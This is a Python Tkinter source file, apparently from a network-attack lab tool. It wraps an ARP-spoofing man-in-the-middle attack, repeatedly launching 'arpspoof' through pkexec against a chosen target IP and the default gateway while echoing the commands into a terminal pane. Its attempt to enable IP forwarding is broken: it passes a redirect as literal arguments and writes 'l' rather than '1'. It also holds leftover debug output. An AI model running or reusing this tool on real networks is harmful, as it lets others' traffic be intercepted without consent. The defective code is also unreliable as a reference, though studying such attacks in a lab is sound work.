import traceback
import subprocess
import threading
import time
from tkinter import *
from ProgramSetup.Footer import Footer

def startArp(terminalContentFrame, wiresharkContentFrame, errorOutputContentFrame, targetIp, defaultGatewayIp) :

    global terminalLabel, errorOutputLabel, isRunning, arpThread

    isRunning = False
    arpThread = threading.Thread(target = lambda : arpLoop(targetIp, defaultGatewayIp))
    
    terminalLabel = Label(terminalContentFrame, text = "", fg="#ffffff", bg="#252525", font="bahnschrift 8", justify = "left", wraplength=480)
    wiresharkLabel = Label(wiresharkContentFrame, text = "", fg="#ffffff", bg="#252525", font="bahnschrift 8", justify = "left", wraplength=480)
    errorOutputLabel = Label(errorOutputContentFrame, text = "", fg="#ffffff", bg="#252525", font="bahnschrift 8", justify = "left", wraplength=480)

    #sudoPw = Footer.getSudoPass()
    #print(sudoPw)
    runArpAttack(targetIp, defaultGatewayIp)

    terminalLabel.pack(anchor = NW)
    errorOutputLabel.pack(anchor = NW)

def stopArp(targetIp, defaultGatewayIp) :
    global arpThread, isRunning
    try:
        isRunning = False
        arpThread.join(0)
        arpThread = None
        #restore(defaultGatewayIp, targetIp)
        #restore(targetIp, defaultGatewayIp)
    except (AttributeError, RuntimeError):
        pass

def runArpAttack(targetIp, defaultGatewayIp):
    global isRunning, arpThread

    isRunning = True
    arpThread.start()

def arpLoop(targetIp, defaultGatewayIp) :
    interface = "eth0"
    count = 3
    try :
        while isRunning == True and count != 0:
            print("ORANGES")
            time.sleep(3)
            count -= 1
            terminalLabel['text'] += "$ echo > l /proc/sys/net/ipv4/ip_forward \n"
            terminalProcess = subprocess.Popen(["echo", ">", "l", "/proc/sys/net/ipv4/ip_forward"], stdout=subprocess.PIPE, universal_newlines=TRUE)
            terminalLabel['text'] += terminalProcess.communicate()[0]

            terminalLabel['text'] += "$ arpspoof -i " + interface + " -t " + targetIp + " -r " + defaultGatewayIp + " \n"
            terminalProcess = subprocess.Popen(["pkexec", "arpspoof", "-i", interface, "-t", targetIp, "-r", defaultGatewayIp], stdout=subprocess.PIPE, universal_newlines=TRUE)
    except Exception:
        errorOutputLabel['text'] += traceback.format_exc()



